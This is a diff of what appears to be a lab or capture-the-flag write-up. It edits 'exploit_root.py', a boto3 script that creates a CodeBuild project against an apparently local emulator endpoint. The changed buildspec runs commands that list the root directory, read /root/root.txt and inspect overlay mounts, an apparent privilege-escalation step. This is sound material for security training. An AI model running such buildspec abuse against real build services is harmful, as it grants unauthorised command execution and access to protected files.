@@ -510,7 +510,7 @@ worker@a147090e066a:~$
 
 ``` python3
 
-cat > exploit_root.py <<
+cat > exploit_root.py << 'EOF'
 
 import boto3
 
@@ -518,7 +518,7 @@ cb = boto3.client("codebuild", endpoint_url="http://172.18.0.2:4566", region_nam
 
 cb.create_project(
     name="poc",
-    source={"type": "NO_SOURCE", "buildspec": "version: 0.2\nphases:\n  build:\n    commands:\n      - id\n      - cat /etc/hostname"},
+    source={"type": "NO_SOURCE", "buildspec": "version: 0.2\nphases:\n  build:\n    commands:\n      - id\n      - ls /\n      - cat /root/root.txt 2>&1 || echo 'no access'\n      - mount | grep -i overlay"},
     artifacts={"type": "NO_ARTIFACTS"},
     environment={
         "type": "LINUX_CONTAINER",
